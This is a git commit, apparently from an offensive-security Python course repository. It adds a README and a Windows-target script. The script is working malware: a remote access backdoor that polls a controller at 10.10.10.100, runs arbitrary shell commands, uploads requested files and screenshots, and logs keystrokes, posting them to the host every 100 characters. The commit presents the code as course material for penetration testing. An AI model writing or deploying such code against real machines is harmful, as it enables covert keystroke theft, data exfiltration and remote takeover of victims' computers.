8065e4dd779bee30c17a282fe6c1c8901ce347f7
Piotr <25606622+p-i-o-t-r-f@users.noreply.github.com>
2018-01-28 20:27:19 +0100

    Add files via upload

---
+++ python-for-offensive-security-practical-course/keylogger-transfer-screen-capture/README.md
@@ -0,0 +1,17 @@
+Kali:  Data Exfiltration_HTTP_server.py
+
+Win Target: keylogger temporary transfer.py
+
+transfer file via HTTP
+
+screencapture
+
+keylogger
+
+####################
+or Win Target: keylogger temporary transfer stop
+
+all above plus create and transfer the file every 100 characters
+
+###################
+To see normal characters instead of chinese symbols, kill the keylogger process 
---
+++ python-for-offensive-security-practical-course/keylogger-transfer-screen-capture/keylogger temporary transfer stop.py
@@ -0,0 +1,134 @@
+# Python For Offensive PenTest: A Complete Practical Course - All rights reserved
+# Follow me on LinkedIn  https://jo.linkedin.com/in/python2
+
+# moze warto luknac tu https://github.com/ajinabraham/Xenotix-Python-Keylogger/blob/master/xenotix_python_logger.py
+
+'''
+Installing Pillow
+C:\Users\hkhrais>pip install Pillow
+'''
+
+import requests
+import keyboard
+import subprocess
+import os
+import time
+import pythoncom, pyHook
+
+from PIL import ImageGrab  # Used to Grab a screenshot
+import tempfile  # Used to Create a temp directory
+import shutil  # Used to Remove the temp directory
+
+dirpath2 = tempfile.mkdtemp()
+
+def keypressed(event):
+    global store
+
+    # Enter and backspace are not handled properly that's why we hardcode thier values to < Enter > and <BACK SPACE>
+    # note that we can know if the user input was enter or backspace based on thier ASCII values
+
+    if event.Ascii == 13:
+        keys = ' < Enter > '
+    elif event.Ascii == 8:
+        keys = ' <BACK SPACE> '
+
+    else:
+        keys = chr(event.Ascii)
+
+    store = store + keys  # at the end we append the ascii keys into store variable and finally write them in keylogs text file
+    if len(store)>100: #save file once is bigger then 100 characters
+        #fp=open("keylogs.txt","a")
+        #fp = open(dirpath2 + "\keylogs.txt", "w")
+        fp = open(dirpath2 + "\keylogs.txt", "a")
+        url = 'http://10.10.10.100/store'
+        files = {'file': open(dirpath2 + "\keylogs.txt", 'rb')}
+        fp.write(store)
+        fp.close()
+        r = requests.post(url, files=files)
+        files['file'].close()
+        store=''
+    return True
+def local():
+    global store
+    if len(store)>100: #save file once is bigger then 100 characters
+        #fp=open("keylogs.txt","a")
+        fp = open(dirpath2 + "\keylogs.txt", "w")
+        #url = 'http://10.10.10.100/store'
+        #files = {'file': open(dirpath2 + "\keylogs.txt", 'rb')}
+        fp.write(store)
+        fp.close()
+        #r = requests.post(url, files=files)
+        #files['file'].close()
+        store=''
+    return True
+    # fp=open("keylogs.txt","w")
+    #dirpath2 = tempfile.mkdtemp()
+    #fp = open(dirpath2 + "\keylogs.txt", "w")
+    #fp.write(store)
+    #fp.close()
+   
+   # send file every time when type sth:   
+    #url = 'http://10.10.10.100/store'
+    #files = {'file': open(dirpath2 + "\keylogs.txt", 'rb')}
+    #r = requests.post(url, files=files)  # Transfer the file over our HTTP
+
+    #files['file'].close()  # Once the file gets transfered, close the file.
+    #return True
+
+
+while True:
+    obj = pyHook.HookManager()
+    req = requests.get('http://10.10.10.100')
+    command = req.text
+
+    if 'terminate' in command:
+        break
+
+    elif 'grab' in command:
+        grab, path = command.split('*')
+        if os.path.exists(path):
+            url = 'http://10.10.10.100/store'
+            files = {'file': open(path, 'rb')}
+            r = requests.post(url, files=files)
+        else:
+            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !')
+
+
+    elif 'screencap' in command:  # If we got a screencap keyword, then ..
+
+        dirpath = tempfile.mkdtemp()  # Create a temp dir to store our screenshot file
+
+        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")  # Save the screencap in the temp dir
+
+        url = 'http://10.10.10.100/store'
+        files = {'file': open(dirpath + "\img.jpg", 'rb')}
+        r = requests.post(url, files=files)  # Transfer the file over our HTTP
+
+        files['file'].close()  # Once the file gets transfered, close the file.
+        shutil.rmtree(dirpath)  # Remove the entire temp dir
+
+    elif 'keylogger' in command:
+           store = ''  # string where we will store all the pressed keys
+           #obj = pyHook.HookManager()
+           obj.KeyDown = keypressed
+           #obj.HookKeyboard()  # start the hooking loop and pump out the messages
+           obj.HookKeyboard()   
+           pythoncom.PumpMessages()
+           #local()
+    elif 'stop' in command:
+           obj.UnhookKeyboard()
+           
+        # elif 'keysend' in command:
+           # url = 'http://10.10.10.100/store'
+           # files = {'file': open(dirpath2 + "\keylogs.txt", 'rb')}
+           # r = requests.post(url, files=files)  # Transfer the file over our HTTP
+
+           # files['file'].close()  # Once the file gets transfered, close the file.
+
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                               stdin=subprocess.PIPE)
+        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read())
+        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read())
+
+    time.sleep(3)
